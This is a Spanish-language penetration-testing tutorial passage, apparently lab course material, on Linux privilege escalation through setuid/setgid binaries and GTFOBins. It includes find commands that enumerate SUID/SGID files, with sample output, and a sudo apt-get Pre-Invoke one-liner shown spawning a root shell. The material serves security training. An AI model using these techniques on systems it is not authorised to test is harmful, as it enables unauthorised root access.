El permiso `Set User ID upon Execution` (`setuid`) puede permitir a un usuario ejecutar un programa o script con los permisos de otro usuario, típicamente con privilegios elevados. El bit `setuid` aparece como una `s`.

```r
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-xr-x 1 root root 16728 Sep  1 19:06 /home/htb-student/shared_obj_hijack/payroll
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 /home/mrb3n/payroll
-rwSr--r-- 1 root root 0 Aug 31 02:51 /home/cliff.moore/netracer
-rwsr-xr-x 1 root root 40152 Nov 30  2017 /bin/mount
-rwsr-xr-x 1 root root 40128 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 27608 Nov 30  2017 /bin/umount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14864 Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 428240 Jan 18  2018 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec
-rwsr-sr-x 1 root root 240 Feb  1  2016 /usr/bin/facter
-rwsr-xr-x 1 root root 39904 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 49584 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 75304 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 54256 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 10624 May  9  2018 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 1588768 Aug 31 00:50 /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root root 94240 Jun  9 14:54 /sbin/mount.nfs
```

Puede ser posible hacer ingeniería inversa (reverse engineering) al programa con el bit `setuid` activado, identificar una vulnerabilidad y explotarla para escalar nuestros privilegios. Muchos programas tienen características adicionales que pueden aprovecharse para ejecutar comandos y, si el bit `setuid` está activado en ellos, estos pueden usarse para nuestro propósito.

El permiso Set-Group-ID (setgid) es otro permiso especial que nos permite ejecutar binarios como si fuéramos parte del grupo que los creó. Estos archivos pueden enumerarse usando el siguiente comando: `find / -uid 0 -perm -6000 -type f 2>/dev/null`. Estos archivos pueden aprovecharse de la misma manera que los binarios `setuid` para escalar privilegios.

```r
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
```

Este [recurso](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits) tiene más información sobre los bits `setuid` y `setgid`, incluyendo cómo establecer los bits.

---

## GTFOBins

El proyecto [GTFOBins](https://gtfobins.github.io/) es una lista curada de binarios y scripts que pueden ser utilizados por un atacante para evadir restricciones de seguridad. Cada página detalla las características del programa que pueden usarse para escapar de restricted shells, escalar privilegios, establecer conexiones de reverse shell y transferir archivos. Por ejemplo, `apt-get` puede usarse para escapar de entornos restringidos y generar un shell agregando un comando Pre-Invoke:

```r
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)
```

Vale la pena familiarizarse con tantos GTFOBins como sea posible para identificar rápidamente configuraciones erróneas cuando caemos en un sistema donde debemos escalar nuestros privilegios para avanzar más.